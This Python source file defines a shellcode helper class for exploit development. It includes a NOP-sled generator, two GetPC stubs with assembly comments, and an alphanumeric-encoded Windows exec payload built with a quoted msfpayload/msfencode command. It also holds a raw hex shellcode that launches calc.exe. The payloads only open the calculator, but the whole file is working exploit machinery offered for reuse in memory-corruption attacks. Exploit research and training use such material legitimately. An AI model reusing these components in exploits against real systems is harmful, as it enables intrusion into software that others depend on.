class Shellcode(object):
	@staticmethod
	def nopsled(nro, nop = "\x90"):
		return nop * nro

	# http://skypher.com/wiki/index.php?title=Hacking/Shellcode/GetPC
	@staticmethod
	def getPC_call():
		getpc = "\xe8\x00\x00\x00\x00"	# $+0:    E8 00000000 CALL    $+5         ; PUSH $+5 onto the stack
		getpc += "\x59"					# $+5:    59          POP     ECX         ; ECX = $+5
		return getpc

	@staticmethod
	def getPC_floating():
		getpc = "\xd9\xee" 			# $+0     D9EE          FLDZ                   ; Floating point stores $+0 in its environment
		getpc += "\xd9\x74\xe4\xf4" # $+2     D974E4 F4     FSTENV SS:[ESP-0xC]    ; Save environment at ESP-0xC; now [ESP] = $+0
		getpc += "\x59" 			# $+6     59            POP ECX                ; ECX = $+0
		return getpc

	@staticmethod
	def win32_exec_calc_alpha():
		# sudo msfpayload windows/exec CMD=calc.exe R | msfencode BufferRegister=ECX -e x86/alpha_mixed
		# we must fill ECX with the address of the decoder
		return "IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlHhLI7pWpWpe0K9KU4qZrQtlKv26PNk62FlnkF2UDnk0rFHDOMgBjvFeakOFQIPLlWLe1cL32dlEpYQJoFmGqHGjBHpCb2wNkCbVplKG25ls1xPLK70QhlEIPpt2jS18Pf0LKSxdXnk68gPS1hSXcWL79lK4tlKGqxVDqiotqiPnLjaJovmEQ9WdxypD5XtESCMih5kcMVDbUm268nkChDdvaN32FlKvlpKnkV85LVa8SnkS4NkgqjpOy74etgT1KqK51f9sjCaKOKPrxqOpZnkGbxkMVqMCZ31LMk589c0eP7pV0E8UaLK0olGyoZuOKzPnUI2cf0hNFoemmmMyoiE5l36sLwzmPKKKPaeUUoKCwVssBpoQzuPccyoKe1s0aBLcS4nREBXcU30AA"

	@staticmethod
	def win32_exec_calc():
		return '31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd76a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7'.decode("hex")